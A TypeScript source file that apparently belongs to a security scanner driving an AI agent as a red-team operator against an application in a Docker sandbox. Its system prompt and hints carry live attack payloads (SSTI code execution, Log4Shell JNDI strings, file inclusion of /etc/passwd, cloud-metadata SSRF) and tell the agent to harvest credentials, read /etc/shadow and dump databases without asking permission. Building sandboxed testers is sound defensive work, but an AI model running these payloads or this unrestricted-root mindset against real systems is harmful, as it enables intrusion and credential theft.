/**
 * BreachScope Sandbox Attack Agent
 *
 * Architecture: PentestGPT / HackingBuddyGPT inspired
 * - AI has FULL ROOT ACCESS inside the container — installs any tool it wants
 * - Persistent attack memory (JSON file) updated after every step
 * - State compression: worldview replaces raw command history
 * - Pentest Task Tree: structured findings, hypotheses, attack chains
 * - AI generates its own payloads and decides its own next move — no scripts
 */

import { agentLoop } from "../core/ai.js";
import { logger } from "../core/logger.js";
import type { Finding } from "../core/types.js";
import type { ChatCompletionTool } from "openai/resources/chat/completions";
import fs from "fs";
import path from "path";
import os from "os";
import type { ProjectType } from "../core/docker.js";

// ── Attack memory schema ──────────────────────────────────────────────────────

interface TriedAttack {
  attack: string;
  target: string;
  result: "success" | "partial" | "failed";
  evidence: string;
  timestamp: string;
}

interface AttackHypothesis {
  id: string;
  hypothesis: string;
  priority: "critical" | "high" | "medium" | "low";
  requires?: string;
  status: "pending" | "in_progress" | "done" | "abandoned";
}

interface ConfirmedFinding {
  id: string;
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  category: string;
  description: string;
  evidence: string;
  remediation: string;
  timestamp: string;
}

interface AttackMemory {
  session_id: string;
  target_url: string;
  project_type: string;
  started_at: string;
  updated_at: string;
  worldview: string;
  env_vars: Record<string, string>;
  credentials: Record<string, string>;
  discovered_services: string[];
  discovered_endpoints: string[];
  tokens: string[];
  interesting_files: string[];
  installed_tools: string[];
  confirmed_findings: ConfirmedFinding[];
  tried_attacks: TriedAttack[];
  hypotheses: AttackHypothesis[];
  attack_chains: string[];
}

// ── Types ─────────────────────────────────────────────────────────────────────

export interface SandboxAgentResult {
  findings: Finding[];
  tokensUsed: number;
  attackLog: string[];
  attackChains: string[];
  memoryPath: string;
}

type ExecFn = (cmd: string[], timeoutMs?: number) => Promise<{ stdout: string; stderr: string; exitCode: number }>;
type LogsFn = (tail?: number) => Promise<string>;

// ── Memory management ─────────────────────────────────────────────────────────

function createMemory(sessionId: string, targetUrl: string, projectType: string): AttackMemory {
  return {
    session_id: sessionId,
    target_url: targetUrl,
    project_type: projectType,
    started_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
    worldview: "Session just started. No information gathered yet.",
    env_vars: {},
    credentials: {},
    discovered_services: [],
    discovered_endpoints: [],
    tokens: [],
    interesting_files: [],
    installed_tools: [],
    confirmed_findings: [],
    tried_attacks: [],
    hypotheses: [
      { id: "h-init-1", hypothesis: "Environment variables contain secrets (DB passwords, API keys, JWT secrets, cloud credentials)", priority: "critical", status: "pending" },
      { id: "h-init-2", hypothesis: "Internal services (databases, caches, message queues) may be accessible without auth", priority: "high", status: "pending" },
      { id: "h-init-3", hypothesis: "Application endpoints vulnerable to injection, auth bypass, or information disclosure", priority: "high", status: "pending" },
    ],
    attack_chains: [],
  };
}

function saveMemory(memPath: string, memory: AttackMemory): void {
  memory.updated_at = new Date().toISOString();
  fs.writeFileSync(memPath, JSON.stringify(memory, null, 2), "utf-8");
}

function loadMemory(memPath: string): AttackMemory {
  return JSON.parse(fs.readFileSync(memPath, "utf-8")) as AttackMemory;
}

// ── Language-specific attack hints ───────────────────────────────────────────

function languageHints(projectType: ProjectType): string {
  const hints: Record<string, string> = {
    node: `Node.js app detected. Key attack surface:
- Check env for JWT_SECRET, DATABASE_URL, REDIS_URL, STRIPE_*, OPENAI_*, AWS_*
- Install: apt-get install -y nodejs npm curl wget netcat-openbsd postgresql-client redis-tools
- Try prototype pollution: send JSON body with __proto__ / constructor.prototype keys
- Check for express-session cookies, JWT tokens in Set-Cookie headers
- npm audit or check node_modules for known-compromised packages
- Test /api/*, /graphql, /_next/, /api/auth/* routes`,

    python: `Python app detected. Key attack surface:
- Check for SSTI (Jinja2/Mako): payloads like {{7*7}}, {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
- Install: pip install requests sqlmap httpx || apt-get install -y python3 python3-pip sqlmap
- Check for Flask/Django debug mode (stack traces), SECRET_KEY in env
- Django: try /admin/, check ALLOWED_HOSTS=*
- Pickle deserialization in POST endpoints
- PATH_INFO manipulation, WSGI env injection`,

    go: `Go app detected. Key attack surface:
- Check env for connection strings, API keys
- Test for SSRF in URL parameters (Go's net/http follows redirects by default)
- Check for goroutine/panic dumps on error endpoints
- Verbose error modes, debug endpoints
- Template injection if using html/template unsafely`,

    java: `Java/Spring app detected. Key attack surface:
- Install: apt-get install -y curl wget netcat-openbsd
- Spring Boot Actuator: try /actuator, /actuator/env, /actuator/heapdump, /actuator/mappings, /actuator/loggers
- Java deserialization: check for ObjectInputStream usage, try ysoserial payloads on POST endpoints with Content-Type: application/x-java-serialized-object
- Log4Shell test: send \${jndi:ldap://x.x.x.x/a} in User-Agent, X-Forwarded-For, username fields
- Check env for SPRING_DATASOURCE_URL, spring.security.user.password, JWT signing keys`,

    ruby: `Ruby/Rails app detected. Key attack surface:
- Install: apt-get install -y ruby curl wget postgresql-client
- Rails secrets: config/secrets.yml, config/credentials.yml.enc, master.key, RAILS_MASTER_KEY in env
- YAML deserialization attacks on POST endpoints
- Try /rails/info/properties (development), /rails/mailers
- Mass assignment via REST endpoints
- Check for verbose SQL errors`,

    php: `PHP app detected. Key attack surface:
- Install: apt-get install -y php curl wget
- SSTI if using Twig/Smarty/Blade
- File inclusion: /?page=../../etc/passwd, /?file=php://filter/convert.base64-encode/resource=index.php
- PHP type juggling: 0 == "admin", loose comparisons in auth
- Laravel: check APP_KEY in env, try /telescope, /.env direct access
- Check phpinfo(), expose_php header`,

    dotnet: `ASP.NET Core app detected. Key attack surface:
- Install: apt-get install -y curl wget
- Check env for ConnectionStrings:*, JWT:Secret, ASPNETCORE_ENVIRONMENT=Development
- YSOSERIAL.NET payloads if JSON.NET deserialization found
- Check /swagger, /swagger/index.html, /healthz, /health, /metrics
- ViewState deserialization (legacy), SSRF in HttpClient usage
- Verbose errors in Development mode`,

    elixir: `Elixir/Phoenix app detected. Key attack surface:
- Install: apt-get install -y curl wget
- Check env for SECRET_KEY_BASE, DATABASE_URL, PHX_*
- Phoenix LiveView: check WebSocket upgrade, CSRF token handling
- Try /dev/dashboard (dev-only Phoenix dashboard)
- Atom exhaustion attacks via dynamic atom creation`,

    rust: `Rust app detected. Key attack surface:
- Install: apt-get install -y curl wget
- Check env for connection strings, API keys
- Test for SSRF in URL processing functions
- Panic/unwrap error paths revealing internal info
- Verbose error responses in debug builds`,

    dart: `Dart app detected. Key attack surface:
- Install: apt-get install -y curl wget
- Check env for DB URIs, API keys, JWT secrets
- Test endpoints for injection and auth bypass`,
  };
  return hints[projectType] ?? "Check env vars, test endpoints for injection and auth bypass.";
}

// ── System prompt — full autonomy, attacker mindset ──────────────────────────

function buildSystemPrompt(projectType: ProjectType): string {
  return `You are an advanced red team operator inside an isolated Docker sandbox. You have been given FULL AUTHORIZATION to find and exploit every vulnerability in this application.

YOU ARE ROOT INSIDE THIS CONTAINER. You can install any tool you want. The container has internet access.
Install tools freely — do not ask permission, do not hesitate.

Common tool installs:
  apt-get install -y nmap curl wget netcat-openbsd postgresql-client redis-tools sqlmap nikto hydra john
  apt-get install -y python3 python3-pip && pip3 install requests sqlmap
  npm install -g retire node-audit

Install, then use. The AI owns this container entirely.

═══════════════════════════════════════════════════════════════
LANGUAGE CONTEXT
═══════════════════════════════════════════════════════════════

${languageHints(projectType)}

═══════════════════════════════════════════════════════════════
THE ATTACKER'S MENTAL MODEL
═══════════════════════════════════════════════════════════════

You are NOT following a checklist. Think like an attacker who wants maximum impact.

1. UNDERSTAND FIRST — 3-4 commands, massive payoff:
   exec_cmd(["env"]) — goldmine of secrets
   exec_cmd(["sh", "-c", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"]) — every open port
   exec_cmd(["sh", "-c", "cat /proc/1/environ | tr '\\0' '\\n'"]) — process env
   exec_cmd(["sh", "-c", "ps aux"]) — what's actually running
   http("GET", "/") — baseline app response

2. EXPLOIT FULLY BEFORE MOVING ON:
   Found DB URL → connect to it, dump tables, find users, admin creds, sessions
   Found JWT_SECRET → forge admin JWT, test every protected endpoint with it
   Found Redis without auth → KEYS *, dump sessions, look for admin tokens
   Found command injection → /etc/shadow, SSH keys, pivot to host
   Found SSTI → execute commands, read /etc/passwd, dump env
   Found Mongo without auth → db.getCollectionNames(), find all users
   Found /actuator/env → extract all Spring Boot config, DB creds
   Found Log4j → exec_cmd to confirm JNDI lookup, document RCE

3. NETWORK RECON INSIDE THE CONTAINER — attackers always do this:
   exec_cmd(["sh", "-c", "apt-get install -y nmap -q && nmap -sV --open -p 1-65535 127.0.0.1 2>/dev/null | head -60"])
   exec_cmd(["sh", "-c", "for p in 3306 5432 6379 27017 9200 9300 2181 8080 8443 9090 4566 5601; do nc -z -w1 127.0.0.1 $p 2>/dev/null && echo \"OPEN: $p\"; done"])
   Each open port = new attack surface. Connect to it. Try default creds. Dump data.

4. HTTP ATTACK — be systematic:
   Discover endpoints: robots.txt, sitemap.xml, /api/swagger.json, /openapi.json
   Test each parameter for: SQLi, XSS, SSTI, path traversal, SSRF
   Test auth: JWT none-alg, weak secret brute, session fixation, IDOR
   Test SSRF: send requests to 169.254.169.254/latest/meta-data (AWS), metadata.google.internal (GCP)
   Fuzz paths: /admin, /debug, /.env, /.git/config, /graphql, /graphiql

5. BUILD ATTACK CHAINS — one finding unlocks the next:
   "JWT_SECRET=weak → forge admin JWT → GET /admin/users → 847 users dumped"
   "DATABASE_URL in env → psql connect → SELECT * FROM users → 1200 bcrypt hashes"
   save_attack_chain() to document these explicitly.

6. BROWSER TESTING — install chromium-driver if you need it:
   exec_cmd(["sh", "-c", "apt-get install -y chromium -q && chromium --headless --no-sandbox --dump-dom http://localhost:PORT 2>/dev/null | head -200"])
   Or just use curl for XSS payload injection — check responses for reflected content.

═══════════════════════════════════════════════════════════════
MEMORY DISCIPLINE
═══════════════════════════════════════════════════════════════

• read_memory() at the START of each iteration
• update_worldview() after every 3-4 tool calls
• save_finding() for every confirmed vulnerability
• record_attempt() for every attack tried (success OR failure)
• add_hypothesis() when you discover a new attack path
• save_attack_chain() for multi-step exploit chains
• save_credential() for every credential, token, or key found

═══════════════════════════════════════════════════════════════
OUTPUT FORMAT
═══════════════════════════════════════════════════════════════

When done, output ONLY a valid JSON array:
[
  {
    "id": "sandbox-<unique>",
    "title": "concise title",
    "severity": "critical|high|medium|low",
    "category": "code",
    "description": "EVIDENCE: exact command used, exact output, what an attacker can do with this",
    "remediation": "specific actionable fix",
    "references": []
  }
]

Severity calibration:
• critical — real secrets confirmed (not placeholders), RCE proven, DB dump executed, auth bypass giving admin access
• high — SSTI with code exec, path traversal reading /etc/passwd, JWT forge working, internal service accessible without auth
• medium — rate limit bypass, SSRF partially working, verbose errors with stack traces, debug endpoints, weak JWT
• low — cookie flags, minor header issues, non-exploitable info disclosure`;
}

// ── Tool definitions ──────────────────────────────────────────────────────────

const TOOLS: ChatCompletionTool[] = [
  {
    type: "function",
    function: {
      name: "read_memory",
      description: "Read your current attack journal. Shows worldview, credentials, services, endpoints, confirmed findings, tried attacks, pending hypotheses. Call this at the start of every iteration.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "update_worldview",
      description: "Replace your compressed worldview with an updated summary. Call after every 3-4 tool calls.",
      parameters: {
        type: "object",
        properties: {
          worldview: { type: "string", description: "Current compressed understanding: tech stack, running services with ports, found credentials (types), access level achieved, confirmed vulns, what to try next." },
        },
        required: ["worldview"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "save_finding",
      description: "Record a confirmed vulnerability. Only call with concrete evidence — a real exploit that worked, a real secret with non-placeholder value, a real bypass.",
      parameters: {
        type: "object",
        properties: {
          title:       { type: "string" },
          severity:    { type: "string", enum: ["critical", "high", "medium", "low"] },
          description: { type: "string", description: "EVIDENCE: exact command, exact output, what the attacker can do" },
          evidence:    { type: "string", description: "Raw evidence — command output, response body" },
          remediation: { type: "string" },
        },
        required: ["title", "severity", "description", "evidence", "remediation"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "record_attempt",
      description: "Record an attack you tried so you don't repeat it.",
      parameters: {
        type: "object",
        properties: {
          attack:   { type: "string" },
          target:   { type: "string" },
          result:   { type: "string", enum: ["success", "partial", "failed"] },
          evidence: { type: "string" },
        },
        required: ["attack", "target", "result", "evidence"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "save_credential",
      description: "Save a credential, token, API key, or connection string you found.",
      parameters: {
        type: "object",
        properties: {
          key:    { type: "string" },
          value:  { type: "string" },
          source: { type: "string" },
        },
        required: ["key", "value", "source"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "add_hypothesis",
      description: "Add a new attack path to investigate.",
      parameters: {
        type: "object",
        properties: {
          hypothesis: { type: "string" },
          priority:   { type: "string", enum: ["critical", "high", "medium", "low"] },
          requires:   { type: "string" },
        },
        required: ["hypothesis", "priority"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "save_attack_chain",
      description: "Document a multi-step attack chain you discovered or completed.",
      parameters: {
        type: "object",
        properties: {
          chain: { type: "string", description: "Full chain, e.g. 'JWT_SECRET found in env → forged admin JWT → accessed /admin/users → dumped 847 records'" },
        },
        required: ["chain"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "exec_cmd",
      description: "Execute a shell command inside the Docker container. You are ROOT. Install any tool. Run network scans. Read any file. No restrictions.",
      parameters: {
        type: "object",
        properties: {
          cmd: {
            type: "array",
            items: { type: "string" },
            description: "Command as array: ['env'] or ['sh', '-c', 'apt-get install -y nmap && nmap -sV 127.0.0.1']",
          },
          timeout_seconds: {
            type: "number",
            description: "Timeout in seconds. Default 60. Use 300 for apt-get installs or long scans.",
          },
        },
        required: ["cmd"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "http",
      description: "Make an HTTP request to the application. No restrictions — send any payload, any headers, any body.",
      parameters: {
        type: "object",
        properties: {
          method:  { type: "string", enum: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"] },
          path:    { type: "string", description: "Relative path (e.g. /api/users) or full URL for SSRF testing" },
          headers: { type: "object", description: "Request headers" },
          body:    { type: "string", description: "Request body" },
        },
        required: ["method", "path"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "get_logs",
      description: "Get container logs. Use after sending attack payloads to catch stack traces, errors, or injection feedback.",
      parameters: {
        type: "object",
        properties: {
          lines: { type: "number" },
        },
      },
    },
  },
];

// ── Main export ───────────────────────────────────────────────────────────────

export async function runSandboxAgent(
  containerId: string,
  containerIP: string,
  appPort: number,
  projectType: ProjectType,
  execFn: ExecFn,
  logsFn: LogsFn
): Promise<SandboxAgentResult> {
  const sessionId = `sandbox-${Date.now()}`;
  const memPath = path.join(os.tmpdir(), `${sessionId}.json`);
  const attackLog: string[] = [];
  const baseUrl = `http://${containerIP}:${appPort}`;

  const initialMemory = createMemory(sessionId, baseUrl, projectType);
  saveMemory(memPath, initialMemory);

  logger.debug(`[sandbox-agent] Attack journal: ${memPath}`);

  // ── Tool implementations ──────────────────────────────────────────────────

  function readMemory(): string {
    const mem = loadMemory(memPath);
    return JSON.stringify({
      worldview: mem.worldview,
      target: mem.target_url,
      project_type: mem.project_type,
      credentials_found: Object.keys(mem.credentials).length,
      credentials_types: Object.keys(mem.credentials),
      discovered_services: mem.discovered_services,
      discovered_endpoints: mem.discovered_endpoints.slice(0, 40),
      interesting_files: mem.interesting_files,
      installed_tools: mem.installed_tools,
      confirmed_findings: mem.confirmed_findings.length,
      confirmed_severities: mem.confirmed_findings.map((f) => `[${f.severity.toUpperCase()}] ${f.title}`),
      tried_attacks: mem.tried_attacks.slice(-20).map((t) => `${t.result.toUpperCase()} — ${t.attack} on ${t.target}`),
      pending_hypotheses: mem.hypotheses.filter((h) => h.status === "pending").map((h) => `[${h.priority}] ${h.hypothesis}`),
      attack_chains: mem.attack_chains,
    }, null, 2);
  }

  function updateWorldview(worldview: string): string {
    const mem = loadMemory(memPath);
    mem.worldview = worldview;
    saveMemory(memPath, mem);
    return JSON.stringify({ success: true });
  }

  function saveFinding(title: string, severity: string, description: string, evidence: string, remediation: string): string {
    const mem = loadMemory(memPath);
    const id = `sandbox-${Date.now()}-${mem.confirmed_findings.length}`;
    mem.confirmed_findings.push({
      id, title,
      severity: severity as ConfirmedFinding["severity"],
      category: "code",
      description,
      evidence: evidence.slice(0, 3000),
      remediation,
      timestamp: new Date().toISOString(),
    });
    saveMemory(memPath, mem);
    attackLog.push(`FINDING [${severity.toUpperCase()}]: ${title}`);
    return JSON.stringify({ success: true, id, total_findings: mem.confirmed_findings.length });
  }

  function recordAttempt(attack: string, target: string, result: string, evidence: string): string {
    const mem = loadMemory(memPath);
    mem.tried_attacks.push({
      attack, target,
      result: result as TriedAttack["result"],
      evidence: evidence.slice(0, 500),
      timestamp: new Date().toISOString(),
    });
    const hyp = mem.hypotheses.find((h) => h.hypothesis.toLowerCase().includes(attack.toLowerCase().slice(0, 20)));
    if (hyp) {
      if (result === "failed") hyp.status = "abandoned";
      else if (result === "success") hyp.status = "done";
    }
    saveMemory(memPath, mem);
    attackLog.push(`ATTEMPT [${result.toUpperCase()}]: ${attack} → ${target}`);
    return JSON.stringify({ success: true });
  }

  function saveCredential(key: string, value: string, source: string): string {
    const mem = loadMemory(memPath);
    mem.credentials[key] = value;
    const lower = key.toLowerCase();
    if ((lower.includes("postgres") || lower.includes("pg") || lower.includes("database")) && !mem.discovered_services.find((s) => s.includes("postgres"))) {
      mem.discovered_services.push(`postgres (credentials in ${source})`);
    }
    if (lower.includes("redis") && !mem.discovered_services.find((s) => s.includes("redis"))) {
      mem.discovered_services.push(`redis (credentials in ${source})`);
    }
    if (lower.includes("mongo") && !mem.discovered_services.find((s) => s.includes("mongo"))) {
      mem.discovered_services.push(`mongodb (credentials in ${source})`);
    }
    if (source?.includes("/") && !mem.interesting_files.includes(source)) {
      mem.interesting_files.push(source);
    }
    saveMemory(memPath, mem);
    attackLog.push(`CREDENTIAL: ${key} (from ${source})`);
    return JSON.stringify({ success: true, key, source });
  }

  function addHypothesis(hypothesis: string, priority: string, requires?: string): string {
    const mem = loadMemory(memPath);
    if (mem.hypotheses.find((h) => h.hypothesis.toLowerCase().trim() === hypothesis.toLowerCase().trim())) {
      return JSON.stringify({ success: false, reason: "duplicate" });
    }
    mem.hypotheses.push({
      id: `h-${Date.now()}`,
      hypothesis,
      priority: priority as AttackHypothesis["priority"],
      requires,
      status: "pending",
    });
    saveMemory(memPath, mem);
    return JSON.stringify({ success: true });
  }

  function saveAttackChain(chain: string): string {
    const mem = loadMemory(memPath);
    if (!mem.attack_chains.includes(chain)) mem.attack_chains.push(chain);
    saveMemory(memPath, mem);
    attackLog.push(`CHAIN: ${chain.slice(0, 100)}`);
    return JSON.stringify({ success: true });
  }

  async function execCmd(cmd: string[], timeoutSeconds = 60): Promise<string> {
    attackLog.push(`exec: ${cmd.join(" ").slice(0, 100)}`);
    const result = await execFn(cmd, timeoutSeconds * 1000);

    // Auto-record installed tools
    const cmdStr = cmd.join(" ");
    if (/apt-get install|pip install|npm install -g/.test(cmdStr) && result.exitCode === 0) {
      const mem = loadMemory(memPath);
      const toolMatch = cmdStr.match(/install\s+(?:-y\s+)?(.+)/);
      if (toolMatch) {
        const tools = (toolMatch[1] ?? "").trim().split(/\s+/).filter((t) => !t.startsWith("-"));
        mem.installed_tools.push(...tools);
        saveMemory(memPath, mem);
      }
    }

    // Auto-extract env vars when running env or reading /proc/*/environ
    if ((cmd[0] === "env" || cmdStr.includes("/environ")) && result.exitCode === 0) {
      const mem = loadMemory(memPath);
      const lines = result.stdout.split("\n");
      let credSaved = 0;
      for (const line of lines) {
        const eqIdx = line.indexOf("=");
        if (eqIdx < 0) continue;
        const k = line.slice(0, eqIdx).trim();
        const v = line.slice(eqIdx + 1).trim();
        if (!k || !v) continue;
        mem.env_vars[k] = v.length > 200 ? v.slice(0, 200) + "…" : v;
        const kUpper = k.toUpperCase();
        const sensitiveKeys = ["PASSWORD", "SECRET", "KEY", "TOKEN", "URL", "DSN", "URI", "CREDENTIAL", "AUTH", "AWS_", "STRIPE_", "OPENAI_", "ANTHROPIC_", "GITHUB_TOKEN", "DATABASE", "MONGO", "REDIS", "ELASTIC"];
        if (sensitiveKeys.some((sk) => kUpper.includes(sk))) {
          const isPlaceholder = /your[_-]|example|changeme|placeholder|<|>|localhost:\d+$|127\.0\.0\.1$/i.test(v);
          if (!isPlaceholder && v.length > 3) {
            mem.credentials[k] = v;
            credSaved++;
          }
        }
      }
      saveMemory(memPath, mem);
      if (credSaved > 0) {
        return JSON.stringify({
          stdout: result.stdout.slice(0, 10_000),
          stderr: result.stderr.slice(0, 2_000),
          exit_code: result.exitCode,
          note: `[BreachScope: auto-extracted ${credSaved} potential credentials]`,
        });
      }
    }

    return JSON.stringify({
      stdout: result.stdout.slice(0, 10_000),
      stderr: result.stderr.slice(0, 2_000),
      exit_code: result.exitCode,
    });
  }

  async function httpTool(method: string, reqPath: string, headers: Record<string, string> = {}, body?: string): Promise<string> {
    const url = reqPath.startsWith("http") ? reqPath : `${baseUrl}${reqPath}`;
    attackLog.push(`HTTP ${method} ${reqPath.slice(0, 80)}`);

    try {
      const resp = await fetch(url, {
        method,
        headers: { "Content-Type": "application/json", ...headers },
        body: body ?? undefined,
        signal: AbortSignal.timeout(15_000),
        redirect: "manual",
      });

      const respHeaders: Record<string, string> = {};
      resp.headers.forEach((v, k) => { respHeaders[k] = v; });

      const text = (await resp.text()).slice(0, 6_000);

      if (resp.status === 200 && reqPath.startsWith("/")) {
        const mem = loadMemory(memPath);
        if (!mem.discovered_endpoints.includes(reqPath)) {
          mem.discovered_endpoints.push(reqPath);
          saveMemory(memPath, mem);
        }
      }

      return JSON.stringify({
        status: resp.status,
        headers: Object.fromEntries(
          Object.entries(respHeaders).filter(([k]) => !["date", "connection", "keep-alive", "transfer-encoding"].includes(k))
        ),
        body: text,
        redirect_location: respHeaders["location"],
      });
    } catch (e) {
      return JSON.stringify({ error: String(e), url });
    }
  }

  async function getLogsTool(lines = 150): Promise<string> {
    return logsFn(lines);
  }

  // ── Agent loop ────────────────────────────────────────────────────────────

  const userMessage = `TARGET: ${baseUrl}
PROJECT TYPE: ${projectType}
CONTAINER ID: ${containerId.slice(0, 12)}
YOU ARE ROOT — install any tool freely.

Start with read_memory() to see your hypotheses, then immediately begin:
1. exec_cmd(["env"]) — extract all env vars and credentials
2. exec_cmd(["sh", "-c", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"]) — all open ports
3. http("GET", "/") — baseline app response

After those 3 commands, call update_worldview() with what you know, then attack the highest-priority finding.

Begin.`;

  let content = "";
  let tokensUsed = 0;

  try {
    const result = await agentLoop(
      {
        system: buildSystemPrompt(projectType),
        messages: [{ role: "user", content: userMessage }],
        tools: TOOLS,
        temperature: 0.15,
        maxTokens: 16_000,
        maxIterations: 60,
      },
      async (toolName, args) => {
        logger.debug(`  [sandbox] ${toolName}(${JSON.stringify(args).slice(0, 100)})`);
        const a = args as Record<string, unknown>;

        switch (toolName) {
          case "read_memory":       return readMemory();
          case "update_worldview":  return updateWorldview(String(a["worldview"] ?? ""));
          case "save_finding":      return saveFinding(
            String(a["title"] ?? ""), String(a["severity"] ?? "low"),
            String(a["description"] ?? ""), String(a["evidence"] ?? ""),
            String(a["remediation"] ?? ""),
          );
          case "record_attempt":    return recordAttempt(
            String(a["attack"] ?? ""), String(a["target"] ?? ""),
            String(a["result"] ?? "failed"), String(a["evidence"] ?? ""),
          );
          case "save_credential":   return saveCredential(
            String(a["key"] ?? ""), String(a["value"] ?? ""),
            String(a["source"] ?? "unknown"),
          );
          case "add_hypothesis":    return addHypothesis(
            String(a["hypothesis"] ?? ""), String(a["priority"] ?? "medium"),
            a["requires"] ? String(a["requires"]) : undefined,
          );
          case "save_attack_chain": return saveAttackChain(String(a["chain"] ?? ""));
          case "exec_cmd":          return execCmd(a["cmd"] as string[], Number(a["timeout_seconds"] ?? 60));
          case "http":              return httpTool(
            String(a["method"] ?? "GET"), String(a["path"] ?? "/"),
            (a["headers"] as Record<string, string> | undefined) ?? {},
            a["body"] ? String(a["body"]) : undefined,
          );
          case "get_logs":          return getLogsTool(Number(a["lines"] ?? 150));
          default:                  return JSON.stringify({ error: `Unknown tool: ${toolName}` });
        }
      }
    );
    content = result.content;
    tokensUsed = result.tokensUsed;
  } catch (e) {
    logger.error(`Sandbox agent error: ${e}`);
  }

  const mem = loadMemory(memPath);

  // Parse any additional findings from final text output
  let additionalFindings: Finding[] = [];
  try {
    const jsonMatch = content.match(/\[[\s\S]*\]/);
    if (jsonMatch) {
      const parsed = JSON.parse(jsonMatch[0]) as Array<{
        id?: string; title?: string; severity?: string;
        category?: string; description?: string; remediation?: string; references?: string[];
      }>;
      if (Array.isArray(parsed)) {
        additionalFindings = parsed.map((f) => ({
          id: f.id ?? `sandbox-ai-${Date.now()}`,
          title: f.title ?? "Unknown finding",
          severity: (f.severity ?? "low") as Finding["severity"],
          category: "code" as const,
          description: f.description ?? "",
          remediation: f.remediation,
          references: f.references,
        }));
      }
    }
  } catch { /* memory findings are authoritative */ }

  // Deduplicate memory + AI output
  const memoryTitles = new Set(mem.confirmed_findings.map((f) => f.title.toLowerCase()));
  const dedupedAdditional = additionalFindings.filter((f) => !memoryTitles.has(f.title.toLowerCase()));

  const memoryFindings: Finding[] = mem.confirmed_findings.map((f) => ({
    id: f.id,
    title: f.title,
    severity: f.severity,
    category: "code" as const,
    description: f.description,
    remediation: f.remediation,
    references: [],
    detail: f.evidence.slice(0, 500),
  }));

  const allFindings = [...memoryFindings, ...dedupedAdditional];

  logger.debug(`[sandbox-agent] Complete: ${allFindings.length} findings · ${mem.tried_attacks.length} attacks · ${mem.attack_chains.length} chains`);

  return {
    findings: allFindings,
    tokensUsed,
    attackLog,
    attackChains: mem.attack_chains,
    memoryPath: memPath,
  };
}
